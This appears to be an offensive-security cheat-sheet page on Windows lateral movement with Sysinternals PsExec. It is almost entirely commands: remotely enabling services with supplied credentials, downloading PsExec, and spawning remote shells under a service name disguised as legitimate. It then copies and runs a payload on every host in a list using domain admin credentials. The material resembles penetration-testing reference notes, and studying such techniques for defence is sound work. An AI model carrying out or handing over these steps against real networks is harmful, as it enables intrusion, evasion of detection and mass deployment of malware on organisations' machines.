---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - living-off-the-land
  - psexec
  - network-protocols
  - smb
  - windows
---
# Living off the Land

## 01 - Sysinternals

> [!IMPORTANT] Conditions
> It requires specific services to be enabled in order for `PsExec64.exe` to work. Here are the commands to enable it.

```
C:\> net.exe use \\<IP>\IPC$ /user:<username> <password>
sc.exe \\<IP> config netdde start= auto
sc.exe \\<IP> config netddedsdm start= auto
sc.exe \\<IP> config clipsrv start= auto
sc.exe \\<IP> start netdde
sc.exe \\<IP> start netddedsdm
sc.exe \\<IP> start clipserv
```

### 1.1 - Copy File from WebDAV

#### 1.1.1 - Command Prompt

```
C:\> net.exe use z: \\live.sysinternals.com\tools

C:\> copy z:\PsExec64.exe .

C:\> net.exe use z: /delete
```

#### 1.1.2 - PowerShell

```
PS C:\> New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"

PS C:\> Copy-Item z:\PsExec64.exe .

PS C:\> Remove-PSDrive -Name Z
```

Accept the EULA.

```
C:\> .\PsExec64.exe -accepteula
```

## 02 - Execute PsExec

### 2.1 - Single Machine

```
C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" cmd.exe

C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" -d -c "C:\path\to\shell.exe"

C:\> .\PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -d -c "C:\path\to\shell.exe"
```

### 2.2 - Multiple Machines

When targeting multiple computers just add the `@` sign.

```
C:\> .\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> "<commands>"
```

## 03 - Use Cases

### 3.1 - Copy and Execute Payload in Multiple Machines

> [!INFO] One administrator user account can have access to all or most machines
> Use an `Administrator` user or any domain admin account that has access to all or most Windows machines.

```
C:\> .\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> cmd.exe /c copy /y "\\<IP>\C$\payload.exe" "C:\Windows\Temp\"

.\PsExec64.exe @hosts.txt -u <domain>\<username> -p <password> -d -c "cmd.exe /c C:\Windows\Temp\payload.exe"
```

---
## References

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### rot169

- [rot169: Abusing Windows Admin Shares (Lateral Movement)](https://www.youtube.com/watch?v=41MUhlHGZ4E)

### harmj0y

- [harmj0y: Pass the Hash is Dead Long Live Pass the Hash](https://blog.harmj0y.net/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)